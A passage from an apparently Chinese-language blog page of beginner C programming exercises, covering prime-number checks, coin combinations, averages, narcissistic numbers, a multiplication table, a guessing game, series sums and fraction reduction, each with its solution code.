0;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=3;i&lt;sqrt(x);i+=2)&#123;</span><br><span class="line">        if(x%i == 0)&#123;</span><br><span class="line">            result = 0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：sqrt(x) 返回类型 double，引入 #include &lt;math.h&gt;</p></blockquote><ul><li>Example 05：判断是否能被已知的且&lt;x的素数整除</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int isPrime(int x,int knownPrimes[],int numberOfKnownPrimes);</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    const int number = 100;</span><br><span class="line">    int prime[number];</span><br><span class="line">    prime[0] = 2;</span><br><span class="line">    int j;</span><br><span class="line">    for(j=1;j&lt;number;j++)&#123;</span><br><span class="line">        prime[j] = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    int count = 1;</span><br><span class="line">    int i = 3;</span><br><span class="line">    while(count &lt; number)&#123;</span><br><span class="line">        if(isPrime(i,prime,count))&#123;</span><br><span class="line">            prime[count++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125; </span><br><span class="line">    for(i=0;i&lt;number;i++)&#123;</span><br><span class="line">        printf(&quot;%d&quot;,prime[i]);</span><br><span class="line">        if((i+1)%5)&#123;</span><br><span class="line">            printf(&quot;\t&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            printf(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int isPrime(int x,int knownPrimes[],int numberOfKnownPrimes)&#123;</span><br><span class="line">    int result = 1;</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;numberOfKnownPrimes;i++)&#123;</span><br><span class="line">        if(x%knownPrimes[i]==0)&#123;</span><br><span class="line">            result = 0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="037-输出100以内的素数"><a href="#037-输出100以内的素数" class="headerlink" title="037 输出100以内的素数"></a>037 输出100以内的素数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">//主函数 </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int x;</span><br><span class="line">    </span><br><span class="line">    for(x=2;x&lt;100;x++)&#123;</span><br><span class="line">        int i;</span><br><span class="line">        int isPrime = 1;</span><br><span class="line">        for(i=2;i&lt;x;i++)&#123;</span><br><span class="line">            if(x%i == 0)&#123;</span><br><span class="line">                isPrime = 0;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        if(isPrime==1)&#123;</span><br><span class="line">            printf(&quot;%d &quot;,x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">        </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="038-凑硬币"><a href="#038-凑硬币" class="headerlink" title="038 凑硬币"></a>038 凑硬币</h2><p>【题目】如何用1角、2角和5角的硬币凑出10元以下的金额呢？</p><p>【代码】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">//主函数 </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int x;</span><br><span class="line">    int one,two,five;</span><br><span class="line">    </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    </span><br><span class="line">    for(one=1;one&lt;x*10;one++)&#123;</span><br><span class="line">        for(two=1;two&lt;x*10/2;two++)&#123;</span><br><span class="line">            for(five=1;five&lt;x*10/5;five++)&#123;</span><br><span class="line">                if(one+two*2+five*5==x*10)&#123;</span><br><span class="line">                    printf(&quot;%d 个1角 + %d 个2角 + %d 个5角 = %d 元\n&quot;,one,two,five,x);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="039-求平均数"><a href="#039-求平均数" class="headerlink" title="039 求平均数"></a>039 求平均数</h2><ul><li><code>Example 01：</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int number;</span><br><span class="line">    int sum = 0;</span><br><span class="line">    int count = 0;</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        </span><br><span class="line">        if(number != -1)&#123;</span><br><span class="line">            sum += number;</span><br><span class="line">            count ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;while(number != -1);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%f\n&quot;,1.0*sum/count);    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>Example 02:</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int number;</span><br><span class="line">    int sum = 0;</span><br><span class="line">    int count = 0;</span><br><span class="line">    </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">        </span><br><span class="line">    while(number != -1)&#123;</span><br><span class="line">        sum += number;</span><br><span class="line">        count ++;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%f\n&quot;,1.0*sum/count);    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="040-水仙花数"><a href="#040-水仙花数" class="headerlink" title="040 水仙花数"></a>040 水仙花数</h2><p>【题目】计算所有N位水仙花数</p><p>【说明】水仙花数是指一个N位正整数（N&gt;&#x3D;3），它的每个位上的数字的N次幂之和等于它本身。</p><p>【输入格式】</p><p>输入在一行中给出一个正整数N（3&lt;&#x3D;N&lt;&#x3D;7）</p><p>【输出格式】</p><p>按递增顺序输出所有N位水仙花数，每个数字占一行</p><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    int first = 1;</span><br><span class="line">    int i = 1;    </span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);    </span><br><span class="line">    while(i&lt;n)&#123;</span><br><span class="line">        first *= 10;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    //遍历100-999</span><br><span class="line">    i = first;</span><br><span class="line">    while(i&lt;first*10)&#123;</span><br><span class="line">        int t = i;</span><br><span class="line">        int sum = 0;</span><br><span class="line">        do&#123;</span><br><span class="line">            int d = t%10;</span><br><span class="line">            t /= 10;</span><br><span class="line">            int p = 1;</span><br><span class="line">            int j = 0;</span><br><span class="line">            //int p = d;</span><br><span class="line">            //int j = 1;</span><br><span class="line">            while(j&lt;n)&#123;</span><br><span class="line">                p *= d;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            sum += p;</span><br><span class="line">        &#125; while(t&gt;0);</span><br><span class="line">        if(sum == i)&#123;</span><br><span class="line">            printf(&quot;%d\n&quot;,i);</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="041-打印九九乘法表"><a href="#041-打印九九乘法表" class="headerlink" title="041 打印九九乘法表"></a>041 打印九九乘法表</h2><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n); </span><br><span class="line">    int i,j;</span><br><span class="line">    i=1;</span><br><span class="line">    while(i&lt;=n)&#123;</span><br><span class="line">        j=1;</span><br><span class="line">        while(j&lt;=i)&#123;</span><br><span class="line">            printf(&quot;%d*%d=%d&quot;,j,i,i*j);</span><br><span class="line">            if(i*j&lt;10)&#123;</span><br><span class="line">                printf(&quot;   &quot;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                printf(&quot;  &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\n&quot;);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="042-统计素数并求和"><a href="#042-统计素数并求和" class="headerlink" title="042 统计素数并求和"></a>042 统计素数并求和</h2><p>【题目】要求统计给定整数M和N区间内素数的个数并对它们求和。</p><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int m,n;</span><br><span class="line">    int i;</span><br><span class="line">    int count = 0;</span><br><span class="line">    int sum = 0;</span><br><span class="line">    </span><br><span class="line">    scanf(&quot;%d %d&quot;,&amp;m,&amp;n); </span><br><span class="line">    </span><br><span class="line">    if(m==1)&#123;</span><br><span class="line">        m=2;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=m;i&lt;=n;i++)&#123;</span><br><span class="line">        int isPrime = 1;</span><br><span class="line">        int k;</span><br><span class="line">        for(k=2;k&lt;i-1;k++)&#123;</span><br><span class="line">            if(i%k == 0)&#123;</span><br><span class="line">                isPrime = 0;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        //判断i是否素数</span><br><span class="line">        if(isPrime)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%d %d\n&quot;,count,sum);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Example 02：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int isPrime(int i)&#123;</span><br><span class="line">    int result = 1;</span><br><span class="line">    int k;</span><br><span class="line">    for(k=2;k&lt;i-1;k++)&#123;</span><br><span class="line">        if(i%k == 0)&#123;</span><br><span class="line">            result = 0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    int m,n;</span><br><span class="line">    int i;</span><br><span class="line">    int count = 0;</span><br><span class="line">    int sum = 0;</span><br><span class="line">    </span><br><span class="line">    scanf(&quot;%d %d&quot;,&amp;m,&amp;n); </span><br><span class="line">    </span><br><span class="line">    if(m==1)&#123;</span><br><span class="line">        m=2;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=m;i&lt;=n;i++)&#123;</span><br><span class="line">        </span><br><span class="line">        //判断i是否素数</span><br><span class="line">        if(isPrime(i))&#123;</span><br><span class="line">            count++;</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    printf(&quot;%d %d\n&quot;,count,sum);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="043-猜数游戏"><a href="#043-猜数游戏" class="headerlink" title="043 猜数游戏"></a>043 猜数游戏</h2><p>【题目】</p><p><img src="https://gitee.com/wugenqiang/PictureBed/raw/master/CS-Notes/20200423172246.png" alt="image-20200301210457942" title="image-20200301210457942"></p><p>【代码】</p><ul><li>Example 01:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int number,n;</span><br><span class="line">    int inp;</span><br><span class="line">    int finished = 0;</span><br><span class="line">    int cnt = 0;</span><br><span class="line">    scanf(&quot;%d %d&quot;,&amp;number,&amp;n);</span><br><span class="line">    do&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;inp);</span><br><span class="line">        cnt++;</span><br><span class="line">        if(inp&lt;0)&#123;</span><br><span class="line">            printf(&quot;Game Over\n&quot;);</span><br><span class="line">            finished = 1;</span><br><span class="line">        &#125;else if(inp&gt;number)&#123;</span><br><span class="line">            printf(&quot;Too big\n&quot;);        </span><br><span class="line">        &#125;else if(inp&lt;number)&#123;</span><br><span class="line">            printf(&quot;Too small\n&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            if(cnt==1)&#123;</span><br><span class="line">                printf(&quot;Bingo!\n&quot;);</span><br><span class="line">            &#125; else if(cnt&lt;=3)&#123;</span><br><span class="line">                printf(&quot;Lucky You!\n&quot;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                printf(&quot;Good Guess!\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            finished = 1;</span><br><span class="line">        &#125; </span><br><span class="line">        if(cnt==n)&#123;</span><br><span class="line">            if(!finished)&#123;</span><br><span class="line">                printf(&quot;Game Over\n&quot;);</span><br><span class="line">                finished = 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; while(!finished);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="044-求序列前N项和"><a href="#044-求序列前N项和" class="headerlink" title="044 求序列前N项和"></a>044 求序列前N项和</h2><p>【题目】计算序列2&#x2F;1+3&#x2F;2+5&#x2F;3+8&#x2F;5+…的前N项之和。</p><p>【代码】</p><ul><li>Example 01:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    double dividend,divisor;</span><br><span class="line">    double sum = 0.0;</span><br><span class="line">    int i;</span><br><span class="line">    double t;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">    dividend = 2;</span><br><span class="line">    divisor = 1;</span><br><span class="line">    for(i=1;i&lt;=n;i++)&#123;</span><br><span class="line">        sum += dividend/divisor;</span><br><span class="line">        t = dividend;</span><br><span class="line">        dividend += divisor;</span><br><span class="line">        divisor = t;</span><br><span class="line">    &#125; </span><br><span class="line">    printf(&quot;%.2f\n&quot;,sum);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="045-约分最简分式"><a href="#045-约分最简分式" class="headerlink" title="045 约分最简分式"></a>045 约分最简分式</h2><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int dividend,divisor;</span><br><span class="line">    scanf(&quot;%d/%d&quot;,&amp;dividend,&amp;divisor);</span><br><span class="line">    int a = dividend;</span><br><span class="line">    int b = divisor;</span><br><span class="line">    int t;</span><br><span class="line">    while(b&gt;0)&#123;</span><br><span class="line">        t = a%b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = t;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%d/%d\n&quot;,dividend/a,divisor/a);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="046-念数字"><a href="#046-念数字" class="headerlink" title="046 念数字"></a>046 念数字</h2><p>【题目】输入一个整数，输出每个数字对应的拼音</p><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int x;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;x);</span><br><span class="line">    if(x&lt;0)&#123;</span><br><span class="line">        printf(&quot;fu &quot;);</span><br><span class="line">        x = -x;</span><br><span class="line">    &#125;</span><br><span class="line">    int mask = 1;</span><br><span class="line">    int t = x;</span><br><span class="line">    while(t&gt;9)&#123;</span><br><span class="line">        t /= 10;</span><br><span class="line">        mask *= 10;</span><br><span class="line">    &#125;</span><br><span class="line">    do&#123;</span><br><span class="line">        int d = x / mask;</span><br><span class="line">        switch(d)&#123;</span><br><span class="line">            case 0: printf(&quot;ling&quot;);break;</span><br><span class="line">            case 1: printf(&quot;yi&quot;);break;</span><br><span class="line">            case 2: printf(&quot;er&quot;);break;</span><br><span class="line">            case 3: printf(&quot;san&quot;);break;</span><br><span class="line">            case 4: printf(&quot;si&quot;);break;</span><br><span class="line">            case 5: printf(&quot;wu&quot;);break;</span><br><span class="line">            case 6: printf(&quot;liu&quot;);break;</span><br><span class="line">            case 7: printf(&quot;qi&quot;);break;</span><br><span class="line">            case 8: printf(&quot;ba&quot;);break;</span><br><span class="line">            case 9: printf(&quot;jiu&quot;);break;</span><br><span class="line">        &#125;</span><br><span class="line">        if(mask&gt;9)&#123;</span><br><span class="line">            printf(&quot; &quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        x %= mask;</span><br><span class="line">        mask /= 10;</span><br><span class="line">    &#125;while(mask&gt;0);</span><br><span class="line">    printf(&quot;\n&quot;); </span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="047-求a的连续和"><a href="#047-求a的连续和" class="headerlink" title="047 求a的连续和"></a>047 求a的连续和</h2><p>【题目】S &#x3D; a + aa + aaa + … +aaa…a（n个a）</p><p>例如：S &#x3D; 2 + 22 + 222 （3个2）</p><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a,n;</span><br><span class="line">    scanf(&quot;%d %d&quot;,&amp;a,&amp;n);</span><br><span class="line">    int sum = 0;</span><br><span class="line">    int i;</span><br><span class="line">    int t = 0;</span><br><span class="line">    for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">        t = t*10 + a;</span><br><span class="line">        sum += t;</span><br><span class="line">    &#125; </span><br><span class="line">    printf(&quot;%d\n&quot;,sum);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="048-输出平均数和大于平均数的数"><a href="#048-输出平均数和大于平均数的数" class="headerlink" title="048 输出平均数和大于平均数的数"></a>048 输出平均数和大于平均数的数</h2><p>【代码】</p><ul><li>Example 01：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> 